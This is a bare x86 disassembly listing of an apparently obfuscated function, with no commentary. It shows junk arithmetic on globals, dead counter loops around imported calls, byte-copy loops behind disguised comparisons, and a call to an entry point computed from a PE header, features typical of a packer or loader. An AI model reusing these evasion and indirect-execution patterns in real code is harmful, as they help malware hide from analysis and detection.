  41b866:	mov    esi,DWORD PTR [ebp-0x8]
  41b869:	xor    eax,edx
  41b86b:	xor    esi,edx
  41b86d:	add    eax,ecx
  41b86f:	add    esi,ecx
  41b871:	imul   eax,esi
  41b874:	mov    esi,DWORD PTR [ebp+0xc]
  41b877:	cmp    esi,eax
  41b879:	mov    eax,DWORD PTR [ebp-0x4]
  41b87c:	je     0x41b847
  41b882:	xor    eax,edx
  41b884:	add    eax,ecx
  41b886:	mov    ecx,DWORD PTR [ebp+0xc]
  41b889:	imul   eax,ecx
  41b88c:	add    eax,DWORD PTR [ebp+0x8]
  41b88f:	mov    DWORD PTR [ebp+0xc],eax
  41b892:	mov    eax,DWORD PTR [ebp+0xc]
  41b895:	pop    esi
  41b896:	leave  
  41b897:	ret    0x8
  41b89a:	push   ebp
  41b89b:	mov    ebp,esp
  41b89d:	sub    esp,0x80
  41b8a3:	push   ebx
  41b8a4:	push   esi
  41b8a5:	push   edi
  41b8a6:	mov    DWORD PTR ds:0x42c010,0xf9a
  41b8b0:	mov    DWORD PTR [ebp-0x3c],0x0
  41b8b7:	dec    eax
  41b8b8:	mov    eax,DWORD PTR [ebp-0x18]
  41b8bb:	mov    DWORD PTR [ebp-0x18],eax
  41b8be:	adc    DWORD PTR ds:0x429014,0x42801c
  41b8c8:	push   0x421d6a
  41b8cd:	call   DWORD PTR ds:0x42402c
  41b8d3:	adc    DWORD PTR ds:0x428018,0x3fb
  41b8dd:	push   0x0
  41b8df:	push   0x67
  41b8e1:	sbb    DWORD PTR ds:0x42b008,0x4024
  41b8eb:	push   0xc
  41b8ed:	mov    DWORD PTR ds:0x429000,0x5718
  41b8f7:	push   0x3
  41b8f9:	and    DWORD PTR ds:0x42b004,0x67ab
  41b903:	push   0x2
  41b905:	push   0x78769798
  41b90a:	or     DWORD PTR ds:0x428024,0x42c014
  41b914:	call   DWORD PTR ds:0x42400c
  41b91a:	or     DWORD PTR ds:0x42c000,0x429014
  41b924:	push   0x57658733
  41b929:	and    DWORD PTR ds:0x42c000,0x42900c
  41b933:	call   DWORD PTR ds:0x424008
  41b939:	push   0x97667654
  41b93e:	call   DWORD PTR ds:0x424000
  41b944:	movzx  eax,BYTE PTR ds:0x428004
  41b94b:	mov    eax,DWORD PTR [ebp-0x18]
  41b94e:	cmp    eax,0xf89c85b6
  41b953:	mov    DWORD PTR ds:0x42c018,0x6f46
  41b95d:	jne    0x41ba3b
  41b963:	sub    DWORD PTR ds:0x42b018,0x42901c
  41b96d:	xor    edi,edi
  41b96f:	inc    edi
  41b970:	xor    esi,esi
  41b972:	inc    esi
  41b973:	mov    DWORD PTR ds:0x429018,0x36e4
  41b97d:	mov    DWORD PTR ds:0x421d66,0xf89c85b5
  41b987:	mov    DWORD PTR ds:0x42c004,0x59b7
  41b991:	cmp    edi,0x20
  41b994:	mov    DWORD PTR ds:0x42c000,0x70dd
  41b99e:	jne    0x41ba00
  41b9a4:	mov    DWORD PTR ds:0x428000,0x41f9
  41b9ae:	cmp    esi,edi
  41b9b0:	mov    DWORD PTR ds:0x42901c,0x1be9
  41b9ba:	jne    0x41ba00
  41b9c0:	or     DWORD PTR ds:0x429010,0x42900c
  41b9ca:	push   DWORD PTR [ebp+0x10]
  41b9cd:	and    DWORD PTR ds:0x428004,0x1bdc
  41b9d7:	push   DWORD PTR [ebp+0xc]
  41b9da:	add    DWORD PTR ds:0x428008,0x6df8
  41b9e4:	push   DWORD PTR [ebp+0x8]
  41b9e7:	call   0x41b718
  41b9ec:	mov    ecx,DWORD PTR ds:0x428018
  41b9f2:	mov    ecx,DWORD PTR ds:0x421c56
  41b9f8:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41b9fe:	mov    DWORD PTR [ecx],eax
  41ba00:	mov    DWORD PTR ds:0x42a018,0x7241
  41ba0a:	inc    esi
  41ba0b:	mov    DWORD PTR ds:0x42b01c,0x57c2
  41ba15:	cmp    esi,0x21
  41ba18:	jne    0x41b973
  41ba1e:	mov    DWORD PTR ds:0x42a010,0x26a0
  41ba28:	inc    edi
  41ba29:	cmp    edi,esi
  41ba2b:	mov    DWORD PTR ds:0x429008,0x19e2
  41ba35:	jne    0x41b970
  41ba3b:	mov    edx,0xf89c85b6
  41ba40:	and    DWORD PTR ds:0x42b014,0x0
  41ba4a:	mov    esi,DWORD PTR ds:0x42b014
  41ba50:	inc    esi
  41ba51:	mov    DWORD PTR ds:0x42b014,esi
  41ba57:	cmp    DWORD PTR ds:0x42b014,0x6
  41ba5e:	jne    0x41ba8c
  41ba64:	push   0x429014
  41ba69:	push   0x534b
  41ba6e:	push   DWORD PTR [ebp-0x18]
  41ba71:	push   0x428028
  41ba76:	push   0x4cdf
  41ba7b:	push   0x423982
  41ba80:	push   DWORD PTR [ebp-0x28]
  41ba83:	push   DWORD PTR [ebp-0x10]
  41ba86:	call   DWORD PTR ds:0x424024
  41ba8c:	cmp    DWORD PTR ds:0x42b014,0x5
  41ba93:	jne    0x41baa6
  41ba99:	mov    esi,DWORD PTR ds:0x42b014
  41ba9f:	inc    esi
  41baa0:	mov    DWORD PTR ds:0x42b014,esi
  41baa6:	cmp    DWORD PTR ds:0x42b014,0x11
  41baad:	jb     0x41ba4a
  41bab3:	adc    esi,DWORD PTR ds:0x429000
  41bab9:	mov    DWORD PTR [ebp-0x4],edx
  41babc:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  41bac3:	add    ecx,0x1410
  41bac9:	lea    eax,[ebp-0x44]
  41bacc:	xor    edi,edi
  41bace:	xor    edi,DWORD PTR ds:0x42b008
  41bad4:	add    edi,DWORD PTR ds:0x42800c
  41bada:	mov    DWORD PTR ds:0x42b008,edi
  41bae0:	mov    DWORD PTR [ebp-0x3c],eax
  41bae3:	lea    eax,[ebp-0x48]
  41bae6:	or     edi,esi
  41bae8:	mov    DWORD PTR [ebp-0x24],eax
  41baeb:	mov    eax,ds:0x421c56
  41baf0:	adc    DWORD PTR ds:0x428014,ebx
  41baf6:	mov    eax,DWORD PTR [eax+0x1c8]
  41bafc:	and    DWORD PTR ds:0x42a01c,0x0
  41bb06:	jmp    0x41bb18
  41bb0b:	mov    edi,DWORD PTR ds:0x42a01c
  41bb11:	inc    edi
  41bb12:	mov    DWORD PTR ds:0x42a01c,edi
  41bb18:	cmp    DWORD PTR ds:0x42a01c,0x1f
  41bb1f:	jae    0x41bb48
  41bb25:	cmp    DWORD PTR ds:0x42a01c,0x2a
  41bb2c:	jne    0x41bb43
  41bb32:	push   DWORD PTR [ebp-0x24]
  41bb35:	push   DWORD PTR [ebp-0x1c]
  41bb38:	push   0x27cc
  41bb3d:	call   DWORD PTR ds:0x424028
  41bb43:	jmp    0x41bb0b
  41bb48:	mov    eax,DWORD PTR [eax]
  41bb4a:	xor    esi,esi
  41bb4c:	or     esi,DWORD PTR ds:0x429000
  41bb52:	adc    DWORD PTR ds:0x429014,esi
  41bb58:	mov    ecx,DWORD PTR [ebp-0x24]
  41bb5b:	mov    esi,0x7510893
  41bb60:	mov    edi,DWORD PTR ds:0x429010
  41bb66:	or     edi,DWORD PTR ds:0x42a01c
  41bb6c:	mov    DWORD PTR ds:0x429010,edi
  41bb72:	xor    eax,esi
  41bb74:	movzx  edi,BYTE PTR ds:0x42a014
  41bb7b:	adc    edi,DWORD PTR ds:0x42a004
  41bb81:	mov    DWORD PTR ds:0x42a014,edi
  41bb87:	mov    edi,0x3272db
  41bb8c:	add    DWORD PTR ds:0x428000,0x429004
  41bb96:	add    eax,edi
  41bb98:	mov    DWORD PTR ds:0x428000,0xa07
  41bba2:	mov    DWORD PTR [ecx],eax
  41bba4:	mov    eax,0x1dcc
  41bba9:	mov    eax,ds:0x421e72
  41bbae:	cmp    eax,0x301ac8f5
  41bbb3:	mov    DWORD PTR ds:0x42a01c,0x9b1
  41bbbd:	jne    0x41bc4c
  41bbc3:	or     ecx,DWORD PTR ds:0x42b014
  41bbc9:	mov    eax,DWORD PTR [ebp-0x4]
  41bbcc:	dec    DWORD PTR ds:0x429000
  41bbd2:	mov    ecx,DWORD PTR ds:0x421c56
  41bbd8:	adc    DWORD PTR ds:0x42a004,ebx
  41bbde:	mov    ecx,DWORD PTR [ecx+0x198]
  41bbe4:	add    ebx,DWORD PTR ds:0x428014
  41bbea:	xor    eax,esi
  41bbec:	sbb    ebx,DWORD PTR ds:0x429010
  41bbf2:	add    eax,edi
  41bbf4:	mov    DWORD PTR [ecx],eax
  41bbf6:	and    DWORD PTR ds:0x428000,0x0
  41bc00:	xor    eax,eax
  41bc02:	add    eax,DWORD PTR ds:0x428000
  41bc08:	inc    eax
  41bc09:	mov    ds:0x428000,eax
  41bc0e:	cmp    DWORD PTR ds:0x428000,0x23
  41bc15:	jne    0x41bc2b
  41bc1b:	push   0x42384f
  41bc20:	push   0x423883
  41bc25:	call   DWORD PTR ds:0x424030
  41bc2b:	cmp    DWORD PTR ds:0x428000,0x17
  41bc32:	jb     0x41bc00
  41bc38:	mov    eax,DWORD PTR [ebp-0x4]
  41bc3b:	and    DWORD PTR ds:0x42a018,edx
  41bc41:	xor    eax,esi
  41bc43:	xor    ebx,ebx
  41bc45:	add    eax,edi
  41bc47:	mov    ds:0x421e72,eax
  41bc4c:	sub    eax,eax
  41bc4e:	mov    eax,ds:0x421c56
  41bc53:	adc    DWORD PTR ds:0x42b018,0x29cb
  41bc5d:	mov    eax,DWORD PTR [eax+0x18c]
  41bc63:	and    DWORD PTR ds:0x42a004,0x0
  41bc6d:	mov    ebx,DWORD PTR ds:0x42a004
  41bc73:	inc    ebx
  41bc74:	mov    DWORD PTR ds:0x42a004,ebx
  41bc7a:	cmp    DWORD PTR ds:0x42a004,0x13
  41bc81:	jne    0x41bca9
  41bc87:	push   0x49d6
  41bc8c:	push   0x649f
  41bc91:	push   DWORD PTR [ebp-0x20]
  41bc94:	push   0x2fe7
  41bc99:	push   0x2c94
  41bc9e:	push   0x42c018
  41bca3:	call   DWORD PTR ds:0x424038
  41bca9:	cmp    DWORD PTR ds:0x42a004,0x11
  41bcb0:	jb     0x41bc6d
  41bcb6:	xor    ecx,ecx
  41bcb8:	xor    ecx,DWORD PTR ds:0x42b004
  41bcbe:	sbb    ecx,DWORD PTR ds:0x42a008
  41bcc4:	mov    DWORD PTR ds:0x42b004,ecx
  41bcca:	mov    eax,DWORD PTR [eax]
  41bccc:	and    DWORD PTR ds:0x429004,0x0
  41bcd6:	xor    ecx,ecx
  41bcd8:	xor    ecx,DWORD PTR ds:0x429004
  41bcde:	inc    ecx
  41bcdf:	mov    DWORD PTR ds:0x429004,ecx
  41bce5:	cmp    DWORD PTR ds:0x429004,0xe
  41bcec:	jne    0x41bd02
  41bcf2:	push   0x42c014
  41bcf7:	push   0x2d10
  41bcfc:	call   DWORD PTR ds:0x42403c
  41bd02:	cmp    DWORD PTR ds:0x429004,0xd
  41bd09:	jne    0x41bd1c
  41bd0f:	mov    ecx,DWORD PTR ds:0x429004
  41bd15:	inc    ecx
  41bd16:	mov    DWORD PTR ds:0x429004,ecx
  41bd1c:	cmp    DWORD PTR ds:0x429004,0x1a
  41bd23:	jb     0x41bcd6
  41bd29:	or     ecx,ecx
  41bd2b:	mov    DWORD PTR [ebp-0x4c],eax
  41bd2e:	mov    ecx,0xf89c85ba
  41bd33:	sub    ebx,DWORD PTR ds:0x42c000
  41bd39:	mov    DWORD PTR [ebp-0x38],ecx
  41bd3c:	and    DWORD PTR ds:0x428024,edx
  41bd42:	mov    DWORD PTR [ebp-0x38],ecx
  41bd45:	and    DWORD PTR ds:0x42c014,0x0
  41bd4f:	mov    ebx,DWORD PTR ds:0x42c014
  41bd55:	inc    ebx
  41bd56:	mov    DWORD PTR ds:0x42c014,ebx
  41bd5c:	cmp    DWORD PTR ds:0x42c014,0x10
  41bd63:	jne    0x41bd77
  41bd69:	push   DWORD PTR [ebp-0x10]
  41bd6c:	push   0x4238ce
  41bd71:	call   DWORD PTR ds:0x424040
  41bd77:	cmp    DWORD PTR ds:0x42c014,0xf
  41bd7e:	jne    0x41bd91
  41bd84:	mov    ebx,DWORD PTR ds:0x42c014
  41bd8a:	inc    ebx
  41bd8b:	mov    DWORD PTR ds:0x42c014,ebx
  41bd91:	cmp    DWORD PTR ds:0x42c014,0x1f
  41bd98:	jb     0x41bd4f
  41bd9e:	sub    eax,eax
  41bda0:	mov    DWORD PTR [ebp-0x38],ecx
  41bda3:	or     DWORD PTR ds:0x429014,0x293b
  41bdad:	mov    DWORD PTR [ebp-0x30],edx
  41bdb0:	sub    edx,0x44be
  41bdb6:	mov    DWORD PTR [ebp-0x38],ecx
  41bdb9:	add    eax,DWORD PTR ds:0x428000
  41bdbf:	mov    DWORD PTR [ebp-0x38],0xf89c85be
  41bdc6:	mov    eax,DWORD PTR [ebp-0x4]
  41bdc9:	movzx  edx,WORD PTR ds:0x428020
  41bdd0:	add    DWORD PTR ds:0x42b00c,edx
  41bdd6:	mov    edx,DWORD PTR [ebp-0x8]
  41bdd9:	adc    ebx,0x414f
  41bddf:	mov    ebx,DWORD PTR [ebp-0x8]
  41bde2:	xor    ebx,esi
  41bde4:	and    DWORD PTR ds:0x42c018,0x42a004
  41bdee:	xor    edx,esi
  41bdf0:	add    edx,ebx
  41bdf2:	movzx  ebx,BYTE PTR ds:0x42a01c
  41bdf9:	and    DWORD PTR ds:0x429018,ebx
  41bdff:	mov    ebx,DWORD PTR [ebp-0x8]
  41be02:	xor    ebx,esi
  41be04:	xor    DWORD PTR ds:0x428028,0x1d40
  41be0e:	xor    eax,esi
  41be10:	sbb    DWORD PTR ds:0x42a008,0x42a018
  41be1a:	add    eax,edi
  41be1c:	lea    edx,[edx+ebx*1+0x975891]
  41be23:	mov    ebx,0x7216
  41be28:	mov    DWORD PTR [ebp-0x14],eax
  41be2b:	mov    ebx,0x8a29a123
  41be30:	mov    DWORD PTR ds:0x429018,0x7968
  41be3a:	cmp    eax,edx
  41be3c:	ja     0x41c14b
  41be42:	mov    DWORD PTR ds:0x42a008,0x16
  41be4c:	cmp    DWORD PTR ds:0x42a008,0x0
  41be53:	je     0x41bea1
  41be59:	cmp    DWORD PTR ds:0x42a008,0xa
  41be60:	jne    0x41be71
  41be66:	push   0x423883
  41be6b:	call   DWORD PTR ds:0x424044
  41be71:	cmp    DWORD PTR ds:0x42a008,0xb
  41be78:	jne    0x41be8d
  41be7e:	xor    ecx,ecx
  41be80:	xor    ecx,DWORD PTR ds:0x42a008
  41be86:	dec    ecx
  41be87:	mov    DWORD PTR ds:0x42a008,ecx
  41be8d:	xor    ecx,ecx
  41be8f:	add    ecx,DWORD PTR ds:0x42a008
  41be95:	dec    ecx
  41be96:	mov    DWORD PTR ds:0x42a008,ecx
  41be9c:	jmp    0x41be4c
  41bea1:	mov    ecx,DWORD PTR [ebp-0x8]
  41bea4:	xor    ecx,esi
  41bea6:	lea    ecx,[ecx+eax*1+0x3272db]
  41bead:	or     DWORD PTR ds:0x429014,0x429018
  41beb7:	mov    DWORD PTR [ebp-0x10],ecx
  41beba:	mov    ecx,DWORD PTR [ebp-0x30]
  41bebd:	xor    ecx,esi
  41bebf:	adc    edx,0x7be1
  41bec5:	lea    ecx,[ebp+ecx*1+0x3272e3]
  41becc:	add    DWORD PTR ds:0x42b00c,0x3739
  41bed6:	mov    DWORD PTR [ebp-0x38],ecx
  41bed9:	and    DWORD PTR ds:0x429010,0x0
  41bee3:	mov    edx,DWORD PTR ds:0x429010
  41bee9:	inc    edx
  41beea:	mov    DWORD PTR ds:0x429010,edx
  41bef0:	cmp    DWORD PTR ds:0x429010,0x21
  41bef7:	jne    0x41bf12
  41befd:	push   0x1770
  41bf02:	push   0x42c01c
  41bf07:	push   0x423946
  41bf0c:	call   DWORD PTR ds:0x424048
  41bf12:	cmp    DWORD PTR ds:0x429010,0x1b
  41bf19:	jb     0x41bee3
  41bf1f:	mov    ecx,DWORD PTR ds:0x421c56
  41bf25:	mov    ecx,DWORD PTR [ecx+0x1bc]
  41bf2b:	and    DWORD PTR ds:0x42900c,0x0
  41bf35:	jmp    0x41bf47
  41bf3a:	mov    edx,DWORD PTR ds:0x42900c
  41bf40:	inc    edx
  41bf41:	mov    DWORD PTR ds:0x42900c,edx
  41bf47:	cmp    DWORD PTR ds:0x42900c,0x19
  41bf4e:	jae    0x41bf96
  41bf54:	cmp    DWORD PTR ds:0x42900c,0xa
  41bf5b:	jne    0x41bf6f
  41bf61:	push   0x42900c
  41bf66:	push   DWORD PTR [ebp-0x28]
  41bf69:	call   DWORD PTR ds:0x424014
  41bf6f:	cmp    DWORD PTR ds:0x42900c,0x9
  41bf76:	jne    0x41bf8b
  41bf7c:	xor    edx,edx
  41bf7e:	or     edx,DWORD PTR ds:0x42900c
  41bf84:	inc    edx
  41bf85:	mov    DWORD PTR ds:0x42900c,edx
  41bf8b:	jmp    0x41bf3a
  41bf90:	adc    edx,DWORD PTR ds:0x42b00c
  41bf96:	mov    DWORD PTR [ebp-0xc],0xf89c85b6
  41bf9d:	and    DWORD PTR ds:0x42b00c,0x0
  41bfa7:	jmp    0x41bfbb
  41bfac:	xor    edx,edx
  41bfae:	xor    edx,DWORD PTR ds:0x42b00c
  41bfb4:	inc    edx
  41bfb5:	mov    DWORD PTR ds:0x42b00c,edx
  41bfbb:	cmp    DWORD PTR ds:0x42b00c,0x10
  41bfc2:	jae    0x41c020
  41bfc8:	cmp    DWORD PTR ds:0x42b00c,0x5
  41bfcf:	jne    0x41bfff
  41bfd5:	push   0x33b5
  41bfda:	push   0x42b014
  41bfdf:	push   0x1dc5
  41bfe4:	push   0x42801c
  41bfe9:	push   DWORD PTR [ebp-0x14]
  41bfec:	push   0x39d8
  41bff1:	push   DWORD PTR [ebp-0x14]
  41bff4:	push   0x8914
  41bff9:	call   DWORD PTR ds:0x424018
  41bfff:	cmp    DWORD PTR ds:0x42b00c,0x4
  41c006:	jne    0x41c01b
  41c00c:	xor    edx,edx
  41c00e:	xor    edx,DWORD PTR ds:0x42b00c
  41c014:	inc    edx
  41c015:	mov    DWORD PTR ds:0x42b00c,edx
  41c01b:	jmp    0x41bfac
  41c020:	mov    DWORD PTR [ebp-0x34],ecx
  41c023:	and    DWORD PTR ds:0x42b01c,0x11ac
  41c02d:	mov    DWORD PTR [ebp-0x20],0xf89c85b5
  41c034:	sub    ecx,ecx
  41c036:	mov    ecx,DWORD PTR [ebp-0xc]
  41c039:	or     edx,DWORD PTR ds:0x428018
  41c03f:	mov    edx,DWORD PTR [ebp-0x10]
  41c042:	xor    ecx,esi
  41c044:	add    ecx,edi
  41c046:	cmp    ecx,edx
  41c048:	je     0x41c117
  41c04e:	mov    eax,DWORD PTR [ebp-0xc]
  41c051:	mov    ecx,DWORD PTR [ebp-0x10]
  41c054:	xor    edx,edx
  41c056:	xor    eax,esi
  41c058:	add    eax,edi
  41c05a:	add    ecx,0xfabdbef1
  41c060:	adc    edx,0xffffffff
  41c063:	xor    ecx,ebx
  41c065:	xor    edx,0x0
  41c068:	mov    DWORD PTR [ebp-0x68],ecx
  41c06b:	mov    DWORD PTR [ebp-0x64],edx
  41c06e:	xor    edx,edx
  41c070:	mov    ecx,eax
  41c072:	add    ecx,0xfabdbef1
  41c078:	adc    edx,0xffffffff
  41c07b:	xor    ecx,ebx
  41c07d:	xor    edx,0x0
  41c080:	mov    DWORD PTR [ebp-0x24],eax
  41c083:	mov    DWORD PTR [ebp-0x74],edx
  41c086:	cmp    ecx,DWORD PTR [ebp-0x68]
  41c089:	jne    0x41c09a
  41c08f:	mov    ecx,DWORD PTR [ebp-0x64]
  41c092:	cmp    edx,ecx
  41c094:	je     0x41c114
  41c09a:	mov    ecx,DWORD PTR [ebp-0xc]
  41c09d:	mov    edx,DWORD PTR [ebp-0x20]
  41c0a0:	xor    edx,esi
  41c0a2:	add    edx,edi
  41c0a4:	imul   edx,eax
  41c0a7:	xor    ecx,esi
  41c0a9:	add    ecx,eax
  41c0ab:	mov    eax,DWORD PTR [ebp-0x34]
  41c0ae:	mov    ebx,DWORD PTR [ebp-0x38]
  41c0b1:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272db]
  41c0b8:	mov    BYTE PTR [edx+eax*1],cl
  41c0bb:	mov    eax,DWORD PTR [ebp-0x20]
  41c0be:	mov    ecx,DWORD PTR [ebp-0x24]
  41c0c1:	xor    eax,esi
  41c0c3:	lea    eax,[ecx+eax*1+0x3272db]
  41c0ca:	mov    ecx,DWORD PTR [ebp-0x10]
  41c0cd:	xor    edx,edx
  41c0cf:	add    ecx,0xfabdbef1
  41c0d5:	adc    edx,0xffffffff
  41c0d8:	xor    edx,0x0
  41c0db:	mov    ebx,0x8a29a123
  41c0e0:	xor    ecx,ebx
  41c0e2:	mov    DWORD PTR [ebp-0x70],ecx
  41c0e5:	mov    DWORD PTR [ebp-0x6c],edx
  41c0e8:	xor    edx,edx
  41c0ea:	mov    ecx,eax
  41c0ec:	add    ecx,0xfabdbef1
  41c0f2:	adc    edx,0xffffffff
  41c0f5:	xor    ecx,ebx
  41c0f7:	xor    edx,0x0
  41c0fa:	mov    DWORD PTR [ebp-0x24],eax
  41c0fd:	mov    DWORD PTR [ebp-0x7c],edx
  41c100:	cmp    ecx,DWORD PTR [ebp-0x70]
  41c103:	jne    0x41c09a
  41c109:	mov    ecx,DWORD PTR [ebp-0x6c]
  41c10c:	cmp    edx,ecx
  41c10e:	jne    0x41c09a
  41c114:	mov    eax,DWORD PTR [ebp-0x14]
  41c117:	mov    ecx,DWORD PTR [ebp-0x8]
  41c11a:	xor    ecx,esi
  41c11c:	lea    eax,[eax+ecx*1+0x3272db]
  41c123:	mov    ecx,DWORD PTR [ebp-0x8]
  41c126:	mov    edx,DWORD PTR [ebp-0x8]
  41c129:	xor    edx,esi
  41c12b:	xor    ecx,esi
  41c12d:	add    ecx,edx
  41c12f:	mov    edx,DWORD PTR [ebp-0x8]
  41c132:	xor    edx,esi
  41c134:	lea    ecx,[ecx+edx*1+0x975891]
  41c13b:	mov    DWORD PTR [ebp-0x14],eax
  41c13e:	cmp    eax,ecx
  41c140:	jbe    0x41be42
  41c146:	mov    ecx,0xf89c85ba
  41c14b:	mov    eax,DWORD PTR [ebp+0xc]
  41c14e:	mov    ds:0x421ada,eax
  41c153:	mov    eax,DWORD PTR [ebp+0x10]
  41c156:	mov    ds:0x421d2e,eax
  41c15b:	mov    eax,ds:0x421ada
  41c160:	mov    edx,DWORD PTR [ebp-0x3c]
  41c163:	sub    eax,edi
  41c165:	xor    eax,esi
  41c167:	mov    DWORD PTR [edx],eax
  41c169:	mov    eax,DWORD PTR [ebp-0x18]
  41c16c:	cmp    eax,0xf89c85b6
  41c171:	jne    0x41c19c
  41c177:	lea    eax,[ebp-0x28]
  41c17a:	mov    DWORD PTR [ebp-0x40],eax
  41c17d:	lea    eax,[ebp+0x4]
  41c180:	mov    DWORD PTR [ebp-0x28],eax
  41c183:	mov    eax,DWORD PTR [ebp-0x28]
  41c186:	test   eax,eax
  41c188:	je     0x41c2b4
  41c18e:	mov    eax,DWORD PTR [ebp-0x1c]
  41c191:	mov    eax,DWORD PTR [ebp-0x8]
  41c194:	lea    eax,[ebp-0x40]
  41c197:	jmp    0x41c2ab
  41c19c:	mov    eax,DWORD PTR [ebp-0x44]
  41c19f:	cmp    eax,0xf89c85b5
  41c1a4:	je     0x41c201
  41c1aa:	mov    eax,DWORD PTR [ebp-0x4]
  41c1ad:	mov    edx,DWORD PTR [ebp-0x48]
  41c1b0:	xor    eax,esi
  41c1b2:	add    eax,edi
  41c1b4:	cmp    eax,edx
  41c1b6:	je     0x41c201
  41c1bc:	mov    eax,ds:0x421c56
  41c1c1:	mov    eax,DWORD PTR [eax+0x194]
  41c1c7:	mov    ecx,DWORD PTR [eax]
  41c1c9:	mov    eax,DWORD PTR [ecx+0x3c]
  41c1cc:	push   DWORD PTR ds:0x421d2e
  41c1d2:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  41c1d6:	push   DWORD PTR ds:0x421ada
  41c1dc:	add    eax,ecx
  41c1de:	mov    ecx,DWORD PTR ds:0x421c56
  41c1e4:	mov    ecx,DWORD PTR [ecx+0x194]
  41c1ea:	push   DWORD PTR [ecx]
  41c1ec:	call   eax
  41c1ee:	mov    ecx,DWORD PTR ds:0x421c56
  41c1f4:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41c1fa:	mov    DWORD PTR [ecx],eax
  41c1fc:	jmp    0x41c2b4
  41c201:	mov    eax,DWORD PTR [ebp-0x4]
  41c204:	mov    edx,DWORD PTR [ebp-0x4c]
  41c207:	xor    eax,esi
  41c209:	add    eax,edi
  41c20b:	cmp    eax,edx
  41c20d:	jne    0x41c26a
  41c213:	mov    eax,DWORD PTR [ebp-0x4]
  41c216:	mov    edx,DWORD PTR ds:0x421c56
  41c21c:	mov    edx,DWORD PTR [edx+0x198]
  41c222:	xor    eax,esi
  41c224:	add    eax,edi
  41c226:	cmp    eax,DWORD PTR [edx]
  41c228:	jne    0x41c247
  41c22e:	mov    eax,DWORD PTR [ebp-0x4]
  41c231:	push   0xf89c85b6
  41c236:	xor    eax,esi
  41c238:	add    eax,edi
  41c23a:	push   eax
  41c23b:	push   ecx
  41c23c:	push   DWORD PTR [ebp-0x8]
  41c23f:	push   DWORD PTR [ebp-0x4]
  41c242:	call   0x413d37
  41c247:	push   DWORD PTR [ebp-0x8]
  41c24a:	push   DWORD PTR [ebp-0x4]
  41c24d:	call   0x41af10
  41c252:	mov    eax,DWORD PTR [ebp-0x4]
  41c255:	xor    eax,esi
  41c257:	add    eax,edi
  41c259:	mov    ds:0x421cda,eax
  41c25e:	mov    eax,DWORD PTR [ebp-0x4]
  41c261:	xor    eax,esi
  41c263:	add    eax,edi
  41c265:	mov    ds:0x421cd2,eax
  41c26a:	lea    eax,[ebp-0x2c]
  41c26d:	mov    DWORD PTR [ebp-0x50],eax
  41c270:	lea    eax,[ebp+0x4]
  41c273:	mov    DWORD PTR [ebp-0x2c],eax
  41c276:	mov    eax,DWORD PTR [ebp-0x2c]
  41c279:	test   eax,eax
  41c27b:	je     0x41c2b4
  41c281:	mov    DWORD PTR [ebp-0x54],0xf152c3d
  41c288:	mov    DWORD PTR [ebp-0x58],0x712ed08
  41c28f:	mov    DWORD PTR [ebp-0x5c],0x373fc2e
  41c296:	mov    DWORD PTR [ebp-0x60],0x72670a1e
  41c29d:	call   0x401000
  41c2a2:	mov    eax,DWORD PTR [ebp-0x1c]
  41c2a5:	mov    eax,DWORD PTR [ebp-0x8]
  41c2a8:	lea    eax,[ebp-0x50]
  41c2ab:	push   eax
  41c2ac:	push   DWORD PTR [ebp-0x4]
  41c2af:	call   0x40cf5e
  41c2b4:	mov    eax,ds:0x421c56
  41c2b9:	add    eax,0x1cc
  41c2be:	mov    DWORD PTR [ebp-0x38],eax
  41c2c1:	lea    eax,[ebp-0x1c]
  41c2c4:	mov    DWORD PTR [ebp+0xc],0xf89c85b6
  41c2cb:	mov    DWORD PTR [ebp-0x3c],eax
  41c2ce:	mov    DWORD PTR [ebp-0x24],0xf89c85b5
  41c2d5:	mov    eax,DWORD PTR [ebp+0xc]
  41c2d8:	xor    eax,esi
  41c2da:	mov    DWORD PTR [ebp+0x10],0x4
  41c2e1:	mov    ecx,DWORD PTR [ebp+0x10]
  41c2e4:	add    eax,edi
  41c2e6:	cmp    eax,ecx
  41c2e8:	je     0x41c3a9
  41c2ee:	mov    eax,DWORD PTR [ebp+0xc]
  41c2f1:	mov    ecx,DWORD PTR [ebp+0x10]
  41c2f4:	xor    edx,edx
  41c2f6:	xor    eax,esi
  41c2f8:	add    eax,edi
  41c2fa:	add    ecx,0xfabdbef1
  41c300:	adc    edx,0xffffffff
  41c303:	xor    ecx,ebx
  41c305:	xor    edx,0x0
  41c308:	mov    DWORD PTR [ebp-0x70],ecx
  41c30b:	mov    DWORD PTR [ebp-0x6c],edx
  41c30e:	xor    edx,edx
  41c310:	mov    ecx,eax
  41c312:	add    ecx,0xfabdbef1
  41c318:	adc    edx,0xffffffff
  41c31b:	xor    ecx,ebx
  41c31d:	xor    edx,0x0
  41c320:	mov    DWORD PTR [ebp-0x20],eax
  41c323:	cmp    ecx,DWORD PTR [ebp-0x70]
  41c326:	jne    0x41c335
  41c32c:	cmp    edx,DWORD PTR [ebp-0x6c]
  41c32f:	je     0x41c3a9
  41c335:	mov    ecx,DWORD PTR [ebp+0xc]
  41c338:	mov    edx,DWORD PTR [ebp-0x24]
  41c33b:	xor    edx,esi
  41c33d:	xor    ecx,esi
  41c33f:	add    ecx,eax
  41c341:	add    edx,edi
  41c343:	imul   edx,eax
  41c346:	mov    eax,DWORD PTR [ebp-0x3c]
  41c349:	mov    ebx,DWORD PTR [ebp-0x38]
  41c34c:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272db]
  41c353:	mov    BYTE PTR [edx+eax*1],cl
  41c356:	mov    eax,DWORD PTR [ebp-0x24]
  41c359:	mov    ecx,DWORD PTR [ebp-0x20]
  41c35c:	mov    edx,DWORD PTR [ebp+0x10]
  41c35f:	xor    eax,esi
  41c361:	lea    eax,[ecx+eax*1+0x3272db]
  41c368:	xor    ecx,ecx
  41c36a:	add    edx,0xfabdbef1
  41c370:	adc    ecx,0xffffffff
  41c373:	xor    ecx,0x0
  41c376:	mov    DWORD PTR [ebp-0x7c],ecx
  41c379:	xor    ebx,ebx
  41c37b:	xor    edx,0x8a29a123
  41c381:	mov    ecx,eax
  41c383:	add    ecx,0xfabdbef1
  41c389:	adc    ebx,0xffffffff
  41c38c:	xor    ecx,0x8a29a123
  41c392:	xor    ebx,0x0
  41c395:	mov    DWORD PTR [ebp-0x20],eax
  41c398:	cmp    ecx,edx
  41c39a:	jne    0x41c335
